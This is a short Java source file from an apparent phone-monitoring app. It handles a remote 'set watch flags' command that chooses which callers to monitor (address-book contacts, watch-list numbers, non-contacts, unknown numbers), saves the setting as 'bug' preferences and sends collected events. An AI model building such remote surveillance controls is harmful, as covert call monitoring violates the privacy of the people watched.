package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.command.WatchFlags;
import com.vvt.std.Constant;

public class PCCSetWatchFlags extends PCCRmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private WatchFlags flag = null;
	
	public PCCSetWatchFlags(WatchFlags flag) {
		this.flag = flag;
	}

	// PCCRmtCmdSync
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.SET_WATCH_FLAGS.getId());		
		prefWatchListInfo.setInAddrbookEnabled(flag.isInAddressbook());
		prefWatchListInfo.setInWatchListEnabled(flag.isInWatchList());
		prefWatchListInfo.setNotInAddrbookEnabled(flag.isNotAddressbook());
		prefWatchListInfo.setUnknownEnabled(flag.isUnknownNumber());
		prefBugInfo.setPrefWatchListInfo(prefWatchListInfo);
		pref.commit(prefBugInfo);
		responseMessage.append(Constant.OK);
		createSystemEventOut(responseMessage.toString());
		observer.cmdExecutedSuccess(this);
		// To send events
		eventSender.sendEvents();
	}
}
